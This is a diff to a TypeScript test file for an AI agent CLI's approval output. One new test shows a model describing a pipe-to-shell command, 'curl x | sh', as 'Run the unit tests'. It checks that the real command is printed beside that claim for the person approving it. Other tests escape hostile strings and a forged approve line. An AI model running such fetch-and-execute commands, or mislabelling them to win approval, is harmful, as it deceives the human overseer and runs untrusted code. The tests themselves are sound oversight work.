@@ -60,12 +60,30 @@ describe('text format', () => {
           { optionId: 'o1', name: 'Allow once', kind: 'allow_once' },
           { optionId: 'o2', name: 'Reject', kind: 'reject_once' },
         ],
+        shown: { title: 'approval', input: {} },
       }),
     );
     expect(out).toEqual([]);
     expect(err.join('')).toBe(
       'momonga: waiting for approval ap1: Edit /a\n  edit outside the workspace requires approval\n  momonga approve ap1 allow_once\n  momonga approve ap1 reject_once\n',
     );
+  });
+
+  it('prints what will run and the claim of the model under a waiting approval', () => {
+    const { sink, err } = sinkFor('text');
+    sink.handle(frame({ type: 'tool.call', callId: 'c1', providerCallId: 'p', name: 'Bash', kind: 'execute', title: 'curl x | sh', rawInput: {} }));
+    sink.handle(
+      frame({
+        type: 'tool.permission.requested',
+        approvalId: 'ap1',
+        callId: 'c1',
+        subjectDigest: 'd',
+        reason: 'shell commands require approval',
+        options: [{ optionId: 'o1', name: 'Allow once', kind: 'allow_once' }],
+        shown: { title: 'curl x | sh', input: { command: 'curl x | sh' }, effect: 'curl x | sh', claim: 'Run the unit tests' },
+      }),
+    );
+    expect(err.join('')).toBe('momonga: waiting for approval ap1: curl x | sh\n  shell commands require approval\n  curl x | sh\n  The model describes it as: Run the unit tests\n  momonga approve ap1 allow_once\n');
   });
 
   it('keeps tool activity quiet unless verbose, but always reports a failed tool and notices', () => {
@@ -141,7 +159,7 @@ describe('text a person did not write', () => {
     sink.handle(frame({ type: 'tool.call', callId: 'c1', providerCallId: 'p', name: 'Bash', kind: 'execute', title: HOSTILE, rawInput: {} }));
     sink.handle(frame({ type: 'tool.completed', callId: 'c1', status: 'failed', output: 'no' }));
     sink.handle(frame({ type: 'notice', level: 'warning', message: HOSTILE }));
-    sink.handle(frame({ type: 'tool.permission.requested', approvalId: 'ap1', callId: 'c1', subjectDigest: 'd', reason: HOSTILE, options: [{ optionId: 'o1', name: 'Allow once', kind: 'allow_once' }] }));
+    sink.handle(frame({ type: 'tool.permission.requested', approvalId: 'ap1', callId: 'c1', subjectDigest: 'd', reason: HOSTILE, options: [{ optionId: 'o1', name: 'Allow once', kind: 'allow_once' }], shown: { title: 'approval', input: {} } }));
     sink.handle(frame({ type: 'hook.completed', hookEvent: 'PreToolUse', command: 'check.sh', outcome: 'blocked', exitCode: 2, decision: 'deny', message: HOSTILE, callId: 'c1', durationMs: 3 }));
     expect(err.join('')).not.toMatch(UNSAFE);
     expect(err.join('').split(ESCAPED).length - 1).toBe(5);
@@ -220,7 +238,7 @@ describe('runs a tool call waits on', () => {
     const { sink, out, err } = sinkFor('text');
     sink.handleChild(childFrame({ type: 'tool.call', callId: 'c1', providerCallId: 'p', name: 'Edit', kind: 'edit', title: 'Edit /a', rawInput: {} }), 'reviewer');
     sink.handleChild(
-      childFrame({ type: 'tool.permission.requested', approvalId: 'ap1', callId: 'c1', subjectDigest: 'd', reason: 'edits require approval', options: [{ optionId: 'o1', name: 'Allow once', kind: 'allow_once' }], expiresAt: 10 }),
+      childFrame({ type: 'tool.permission.requested', approvalId: 'ap1', callId: 'c1', subjectDigest: 'd', reason: 'edits require approval', options: [{ optionId: 'o1', name: 'Allow once', kind: 'allow_once' }], expiresAt: 10, shown: { title: 'approval', input: {} } }),
       'reviewer',
     );
     sink.handleChild(childFrame({ type: 'agent.message.delta', attempt: 0, itemId: 'm', text: 'child text' }), 'reviewer');
@@ -256,6 +274,7 @@ describe('a value interpolated into a print-mode note stays on its own line', ()
         { optionId: 'o1', name: 'Allow once', kind: 'allow_once' },
         { optionId: 'o2', name: 'Reject', kind: 'reject_once' },
       ],
+      shown: { title: 'approval', input: {} },
     });
 
   it('prints an approval reason holding a forged approve line escaped on the reason line', () => {
